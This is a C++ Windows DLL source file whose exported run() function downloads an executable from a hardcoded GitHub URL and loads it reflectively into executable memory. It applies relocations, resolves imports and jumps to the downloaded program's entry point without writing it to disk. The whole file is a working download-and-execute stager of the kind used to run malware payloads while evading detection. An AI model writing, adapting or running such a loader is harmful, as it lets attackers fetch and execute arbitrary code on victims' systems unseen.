// dllmain.cpp : Defines the entry point for the DLL application.
#include "pch.h"


#include <Windows.h>
#include <stdio.h>
#include <vector>
#include <winhttp.h>

#pragma comment(lib, "winhttp")

#pragma warning (disable: 4996)
#define _CRT_SECURE_NO_WARNINGS


typedef struct _BASE_RELOCATION_ENTRY {
    WORD Offset : 12;
    WORD Type : 4;
} BASE_RELOCATION_ENTRY;

char* GetPE(wchar_t* domain, wchar_t* path) {
    std::vector<unsigned char> PEbuf;
    DWORD dwSize = 0;
    DWORD dwDownloaded = 0;
    LPSTR pszOutBuffer;
    BOOL  bResults = FALSE;
    HINTERNET  hSession = NULL,
        hConnect = NULL,
        hRequest = NULL;
    // Use WinHttpOpen to obtain a session handle.
    hSession = WinHttpOpen(L"WinHTTP Example/1.0",
        WINHTTP_ACCESS_TYPE_DEFAULT_PROXY,
        WINHTTP_NO_PROXY_NAME,
        WINHTTP_NO_PROXY_BYPASS, 0);

    // https://github.com/D1rkMtr/test/blob/main/MsgBoxArgs.exe?raw=true
    // Specify an HTTP server.
    if (hSession)
        hConnect = WinHttpConnect(hSession, domain,
            INTERNET_DEFAULT_HTTPS_PORT, 0);

    // Create an HTTP request handle.
    if (hConnect)
        hRequest = WinHttpOpenRequest(hConnect, L"GET", path,
            NULL, WINHTTP_NO_REFERER,
            WINHTTP_DEFAULT_ACCEPT_TYPES,
            WINHTTP_FLAG_SECURE);

    // Send a request.
    if (hRequest)
        bResults = WinHttpSendRequest(hRequest,
            WINHTTP_NO_ADDITIONAL_HEADERS,
            0, WINHTTP_NO_REQUEST_DATA, 0,
            0, 0);


    // End the request.
    if (bResults)
        bResults = WinHttpReceiveResponse(hRequest, NULL);

    // Keep checking for data until there is nothing left.
    if (bResults)
        do
        {
            // Check for available data.
            dwSize = 0;
            if (!WinHttpQueryDataAvailable(hRequest, &dwSize))
                printf("Error %u in WinHttpQueryDataAvailable.\n", GetLastError());

            // Allocate space for the buffer.
            pszOutBuffer = new char[dwSize + 1];
            if (!pszOutBuffer)
            {
                printf("Out of memory\n");
                dwSize = 0;
            }
            else
            {
                // Read the Data.
                ZeroMemory(pszOutBuffer, dwSize + 1);

                if (!WinHttpReadData(hRequest, (LPVOID)pszOutBuffer,
                    dwSize, &dwDownloaded))
                    printf("Error %u in WinHttpReadData.\n", GetLastError());
                else {
                    //printf("%s\n", pszOutBuffer);
                    PEbuf.insert(PEbuf.end(), pszOutBuffer, pszOutBuffer + dwDownloaded);
                    //strcat_s(PE,sizeof pszOutBuffer,pszOutBuffer);
                }

                // Free the memory allocated to the buffer.
                delete[] pszOutBuffer;
            }

        } while (dwSize > 0);

        if (PEbuf.empty() == TRUE)
        {
            printf("Failed in retrieving the PE");
        }


        // Report any errors.
        if (!bResults)
            printf("Error %d has occurred.\n", GetLastError());

        // Close any open handles.
        if (hRequest) WinHttpCloseHandle(hRequest);
        if (hConnect) WinHttpCloseHandle(hConnect);
        if (hSession) WinHttpCloseHandle(hSession);

        size_t size = PEbuf.size();
        char* PE = (char*)malloc(size);
        for (int i = 0; i < PEbuf.size(); i++) {
            PE[i] = PEbuf[i];
        }
        return PE;
}

BOOL RunPE(char* PEdata) {

    PIMAGE_DOS_HEADER DOSheader = (PIMAGE_DOS_HEADER)PEdata;
    PIMAGE_NT_HEADERS NTheader = (PIMAGE_NT_HEADERS)((char*)(PEdata)+DOSheader->e_lfanew);
    if (!NTheader) {
        printf(" [-] Not a PE file\n");
        return FALSE;
    }
    BYTE* MemImage = (BYTE*)VirtualAlloc(NULL, NTheader->OptionalHeader.SizeOfImage, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
    if (!MemImage) {
        printf(" [-] Failed in Allocating Image Memory (%u)\n", GetLastError());
        return FALSE;
    }
    // Map Headers&Sections
    memcpy(MemImage, PEdata, NTheader->OptionalHeader.SizeOfHeaders);
    PIMAGE_SECTION_HEADER sectionHdr = IMAGE_FIRST_SECTION(NTheader);
    for (WORD i = 0; i < NTheader->FileHeader.NumberOfSections; i++) {
        memcpy((BYTE*)(MemImage)+sectionHdr[i].VirtualAddress, (BYTE*)(PEdata)+sectionHdr[i].PointerToRawData, sectionHdr[i].SizeOfRawData);
    }
    // Apply Relocations
    IMAGE_DATA_DIRECTORY DirectoryReloc = NTheader->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_BASERELOC];
    if (DirectoryReloc.VirtualAddress == 0) {
        printf("Failed in Relocating Image\n");
        return FALSE;
    }
    PIMAGE_BASE_RELOCATION BaseReloc = (PIMAGE_BASE_RELOCATION)(DirectoryReloc.VirtualAddress + (ULONG_PTR)MemImage);
    while (BaseReloc->VirtualAddress != 0) {
        DWORD page = BaseReloc->VirtualAddress;
        if (BaseReloc->SizeOfBlock >= sizeof(IMAGE_BASE_RELOCATION))
        {
            size_t count = (BaseReloc->SizeOfBlock - sizeof(IMAGE_BASE_RELOCATION)) / sizeof(WORD);
            BASE_RELOCATION_ENTRY* list = (BASE_RELOCATION_ENTRY*)(LPWORD)(BaseReloc + 1);
            for (size_t i = 0; i < count; i++) {
                if (list[i].Type & 0xA) {
                    DWORD rva = list[i].Offset + page;
                    PULONG_PTR p = (PULONG_PTR)((LPBYTE)MemImage + rva);
                    // Relocate the address
                    *p = ((*p) - NTheader->OptionalHeader.ImageBase) + (ULONG_PTR)MemImage;
                }
            }
        }
        BaseReloc = (PIMAGE_BASE_RELOCATION)((LPBYTE)BaseReloc + BaseReloc->SizeOfBlock);
    }
    // Loading Imports
    IMAGE_DATA_DIRECTORY DirectoryImports = NTheader->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_IMPORT];
    if (!DirectoryImports.VirtualAddress) {
        return FALSE;
    }
    PIMAGE_IMPORT_DESCRIPTOR ImportDescriptor = (PIMAGE_IMPORT_DESCRIPTOR)(DirectoryImports.VirtualAddress + (ULONG_PTR)MemImage);
    while (ImportDescriptor->Name != NULL)
    {
        LPCSTR ModuleName = (LPCSTR)ImportDescriptor->Name + (ULONG_PTR)MemImage;
        HMODULE Module = LoadLibraryA(ModuleName);
        if (Module)
        {
            PIMAGE_THUNK_DATA thunk = NULL;
            thunk = (PIMAGE_THUNK_DATA)((ULONG_PTR)MemImage + ImportDescriptor->FirstThunk);

            while (thunk->u1.AddressOfData != NULL)
            {
                ULONG_PTR FuncAddr = NULL;
                if (IMAGE_SNAP_BY_ORDINAL(thunk->u1.Ordinal))
                {
                    LPCSTR functionOrdinal = (LPCSTR)IMAGE_ORDINAL(thunk->u1.Ordinal);
                    FuncAddr = (ULONG_PTR)GetProcAddress(Module, functionOrdinal);
                }
                else
                {
                    PIMAGE_IMPORT_BY_NAME FuncName = (PIMAGE_IMPORT_BY_NAME)((ULONG_PTR)MemImage + thunk->u1.AddressOfData);
                    FuncAddr = (ULONG_PTR)GetProcAddress(Module, FuncName->Name);
                }
                thunk->u1.Function = FuncAddr;
                ++thunk;
            }
        }
        ImportDescriptor++;
    }
    ULONG_PTR EntryPoint = NTheader->OptionalHeader.AddressOfEntryPoint + (ULONG_PTR)MemImage;

    int (*Entry)() = (int(*)())EntryPoint;


    Entry();

}


BOOL APIENTRY DllMain(HMODULE hModule,
    DWORD  ul_reason_for_call,
    LPVOID lpReserved
)
{
    switch (ul_reason_for_call)
    {

    case DLL_PROCESS_ATTACH:
    case DLL_THREAD_ATTACH:
    case DLL_THREAD_DETACH:
    case DLL_PROCESS_DETACH:
        break;
    }
    return TRUE;
}


extern "C" {
    __declspec(dllexport) void WINAPI run() {
        // uri like : https://github.com/Saad-AHLA/mirrordump/raw/main/DocUpload.exe
        char uri[4096] = "https://github.com/Saad-AHLA/mirrordump/raw/main/DocsPLZ.exe";

        char* PEdata = NULL;

        char domain[50];
        char path[500];
        sscanf(uri, "https://%31[^/]/%63[^\n]", domain, path);

        wchar_t Wdomain[50];
        mbstowcs(Wdomain, domain, strlen(domain) + 1);//Plus null
        wchar_t Wpath[500];
        mbstowcs(Wpath, path, strlen(path) + 1);//Plus null 

        PEdata = GetPE(Wdomain, Wpath);

        BOOL status = RunPE(PEdata);

    }
}
